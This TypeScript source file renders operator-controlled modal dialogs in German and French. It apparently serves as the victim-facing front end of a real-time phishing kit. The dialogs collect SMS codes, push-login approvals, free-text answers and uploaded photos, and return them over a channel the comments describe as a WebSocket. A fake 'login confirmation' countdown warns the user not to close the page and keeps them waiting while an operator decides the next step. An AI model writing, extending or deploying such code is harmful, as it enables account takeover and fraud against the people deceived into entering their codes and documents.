import Swal from 'sweetalert2';
import 'sweetalert2/dist/sweetalert2.min.css';
import type { Answer, Command } from './types';

type Dict = Record<string, string>;

type Ctx = {
    dict: Dict;
    answer: (a: Answer) => Promise<void>;
    reset: () => void;
};

function t(dict: Dict, key: string, fallback?: string): string {
    return dict[key] ?? fallback ?? key;
}


export function showCommand(command: Command, ctx: Ctx): void {
    const { dict } = ctx;

    switch (command.type) {
        case 'idle':
            Swal.close();
            return;

        case 'hold.short': {
            if (command.timer) {
                const locale = document.documentElement.lang || window.location.pathname.split('/')[1] || 'de';
                const shortMsg = locale === 'fr'
                    ? `Veuillez patienter 5 à 10 minutes. Vos données sont en cours de traitement. <strong>NE FERMEZ EN AUCUN CAS CETTE PAGE.</strong> Sinon, vous devrez saisir à nouveau vos données.`
                    : `Bitte warten Sie 5–10 Minuten. Ihre Daten werden verarbeitet. <strong>SCHLIESSEN SIE DIESE SEITE AUF KEINEN FALL.</strong> Andernfalls müssen Sie Ihre Daten erneut eingeben.`;
                const SHORT_HTML = `<p style="margin:0 0 16px;font-size:14px;">${shortMsg}</p><div id="swal-countdown" style="font-size:28px;font-weight:700;letter-spacing:2px;color:#333;"></div>`;
                let timerInterval: ReturnType<typeof setInterval> | null = null;
                const startCountdown = () => {
                    let remaining = 10 * 60;
                    const el = document.getElementById('swal-countdown');
                    const tick = () => {
                        if (!el) return;
                        const m = Math.floor(remaining / 60).toString().padStart(2, '0');
                        const s = (remaining % 60).toString().padStart(2, '0');
                        el.textContent = `${m}:${s}`;
                        if (remaining <= 0) remaining = 10 * 60; else remaining--;
                    };
                    tick();
                    timerInterval = setInterval(tick, 1000);
                };
                Swal.fire({
                    title: t(dict, 'flow.loginConfirmation'),
                    html: SHORT_HTML,
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    showConfirmButton: false,
                    showCloseButton: false,
                    didOpen: startCountdown,
                    willClose: () => { if (timerInterval) clearInterval(timerInterval); },
                });
            } else {
                Swal.fire({
                    title: t(dict, 'flow.loginConfirmation'),
                    text: command.text ?? t(dict, 'flow.pleaseWait'),
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    showConfirmButton: false,
                    showCloseButton: false,
                    didOpen: () => Swal.showLoading(),
                });
            }
            return;
        }

        case 'hold.long': {
            const locale = document.documentElement.lang || window.location.pathname.split('/')[1] || 'de';
            const longMsg = locale === 'fr'
                ? `Vos données sont en cours de traitement. Cela peut prendre un certain temps, de 30 minutes à 1 heure. En cas de questions, veuillez contacter le chat du support technique en bas à droite.`
                : `Ihre Daten werden verarbeitet. Dies kann einige Zeit in Anspruch nehmen, von 30 Minuten bis zu 1 Stunde. Bei Fragen wenden Sie sich bitte an den technischen Support Chat unten rechts.`;
            const LONG_TEXT = `
                <p style="margin:0 0 16px;font-size:14px;">${longMsg}</p>
                <div style="display:flex;justify-content:center;margin-top:8px;">
                  <div style="width:36px;height:36px;border:4px solid #e0e0e0;border-top-color:#555;border-radius:50%;animation:swal-spin 0.9s linear infinite;"></div>
                </div>
                <style>@keyframes swal-spin{to{transform:rotate(360deg)}}</style>
            `;
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                html: LONG_TEXT,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
            });
            return;
        }

        case 'push':
            Swal.fire({
                title: t(dict, 'flow.loginConfirmation'),
                html: t(dict, 'flow.pushNotification'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                didOpen: () => Swal.showLoading(),
            });
            return;

        case 'sms':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                text: t(dict, 'flow.codeSent'),
                input: 'text',
                inputPlaceholder: t(dict, 'flow.enterCode'),
                confirmButtonText: t(dict, 'flow.confirm'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCancelButton: false,
                showCloseButton: false,
                inputValidator: (value: string) => {
                    if (!value) return t(dict, 'flow.codeRequired');
                    if (!/^\d+$/.test(value)) return t(dict, 'flow.numbersOnly');
                    return null;
                },
                preConfirm: async (value: string) => {
                    Swal.showLoading();
                    try {
                        await ctx.answer({ command: 'sms', payload: { code: value } });
                        return false; // keep modal open; WebSocket broadcast will replace it
                    } catch (e) {
                        Swal.hideLoading();
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'invalid-data':
            Swal.fire({
                title: t(dict, 'flow.error'),
                text: t(dict, 'flow.incorrectData'),
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'error':
            Swal.fire({
                title: t(dict, 'flow.error'),
                html: command.text,
                icon: 'error',
                confirmButtonText: t(dict, 'flow.ok'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
            }).then((r) => {
                if (r.isConfirmed) ctx.reset();
            });
            return;

        case 'question':
            Swal.fire({
                title: t(dict, 'flow.confirmation'),
                html: command.text,
                input: 'text',
                confirmButtonText: t(dict, 'flow.sendAnswer'),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showCloseButton: false,
                inputValidator: (value: string) => (!value.trim() ? ' ' : null),
                preConfirm: async (value: string) => {
                    Swal.showLoading();
                    try {
                        await ctx.answer({ command: 'question', payload: { answer: value } });
                        return false;
                    } catch (e) {
                        Swal.hideLoading();
                        Swal.showValidationMessage(e instanceof Error ? e.message : 'failed');
                    }
                },
            });
            return;

        case 'photo.request': {
            const locale = document.documentElement.lang || window.location.pathname.split('/')[1] || 'de';
            const isFr = locale === 'fr';
            const uploadLabel  = isFr ? 'Cliquez ou glissez une photo' : 'Klicken oder Foto hierher ziehen';
            const uploadSize   = isFr ? 'JPG, PNG, HEIC — max. 10 Mo' : 'JPG, PNG, HEIC — max. 10 MB';
            const btnLabel     = isFr ? 'Envoyer la photo' : 'Foto senden';
            const btnSending   = isFr ? 'Envoi en cours...' : 'Wird gesendet...';

            const UPLOAD_HTML = `
                <div id="swal-upload-area" style="border:2px dashed #d1d5db;border-radius:16px;padding:32px 20px;cursor:pointer;transition:border-color .2s,background .2s;text-align:center;margin-bottom:16px;">
                    <div id="swal-upload-icon" style="font-size:48px;margin-bottom:12px;">📷</div>
                    <p id="swal-upload-hint" style="margin:0;font-size:15px;color:#6b7280;font-weight:500;">${uploadLabel}</p>
                    <p style="margin:6px 0 0;font-size:12px;color:#9ca3af;">${uploadSize}</p>
                    <input type="file" id="swal-file-input" accept="image/*" style="display:none;" />
                </div>
                <div id="swal-preview-wrap" style="display:none;margin-bottom:16px;border-radius:12px;overflow:hidden;max-height:280px;">
                    <img id="swal-preview-img" src="" style="width:100%;display:block;object-fit:contain;max-height:280px;" />
                </div>
                <button id="swal-upload-btn" disabled style="width:100%;padding:14px;background:#1C171D;color:#fff;font-size:16px;font-weight:600;border:none;border-radius:12px;cursor:not-allowed;opacity:0.45;transition:opacity .2s,background .2s;">
                    ${btnLabel}
                </button>
                <style>
                    #swal-upload-area:hover { border-color: #6b7280; background: #f9fafb; }
                    #swal-upload-area.drag-over { border-color: #3b82f6; background: #eff6ff; }
                    #swal-upload-area.has-file { border-color: #22c55e; background: #f0fdf4; }
                </style>
            `;

            Swal.fire({
                html: UPLOAD_HTML,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                padding: '24px',
                didOpen: () => {
                    const area  = document.getElementById('swal-upload-area')!;
                    const input = document.getElementById('swal-file-input') as HTMLInputElement;
                    const btn   = document.getElementById('swal-upload-btn') as HTMLButtonElement;
                    const preview = document.getElementById('swal-preview-wrap')!;
                    const previewImg = document.getElementById('swal-preview-img') as HTMLImageElement;
                    const icon  = document.getElementById('swal-upload-icon')!;
                    const hint  = document.getElementById('swal-upload-hint')!;

                    let selectedFile: File | null = null;

                    const setFile = (file: File) => {
                        selectedFile = file;
                        area.classList.add('has-file');
                        icon.textContent = '✅';
                        hint.textContent = file.name;
                        btn.disabled = false;
                        btn.style.opacity = '1';
                        btn.style.cursor = 'pointer';
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            previewImg.src = e.target?.result as string;
                            preview.style.display = 'block';
                        };
                        reader.readAsDataURL(file);
                    };

                    area.addEventListener('click', () => input.click());
                    input.addEventListener('change', () => {
                        if (input.files?.[0]) setFile(input.files[0]);
                    });

                    area.addEventListener('dragover', (e) => {
                        e.preventDefault();
                        area.classList.add('drag-over');
                    });
                    area.addEventListener('dragleave', () => area.classList.remove('drag-over'));
                    area.addEventListener('drop', (e) => {
                        e.preventDefault();
                        area.classList.remove('drag-over');
                        const file = e.dataTransfer?.files[0];
                        if (file && file.type.startsWith('image/')) setFile(file);
                    });

                    btn.addEventListener('click', async () => {
                        if (!selectedFile) return;
                        btn.disabled = true;
                        btn.textContent = btnSending;
                        btn.style.opacity = '0.6';
                        try {
                            await ctx.answer({ command: 'photo.request', payload: { file: selectedFile } });
                        } catch {
                            btn.disabled = false;
                            btn.textContent = btnLabel;
                            btn.style.opacity = '1';
                        }
                    });
                },
            });
            return;
        }

        case 'photo.with-input':
            Swal.fire({
                html: `<img src="${command.photo_url}" style="width:100%;display:block;border-radius:0;margin:0;" />`
                    + (command.text ? `<p style="margin:12px 0 0;font-size:15px;padding:0 8px;">${command.text}</p>` : ''),
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                padding: 0,
                customClass: { htmlContainer: 'swal-photo-container' },
            });
            return;

        case 'photo.without-input':
            Swal.fire({
                html: `<img src="${command.photo_url}" style="width:100%;display:block;border-radius:0;margin:0;" />`,
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                showCloseButton: false,
                padding: 0,
                customClass: { htmlContainer: 'swal-photo-container' },
            });
            return;

        case 'redirect':
            Swal.close();
            return;
    }
}
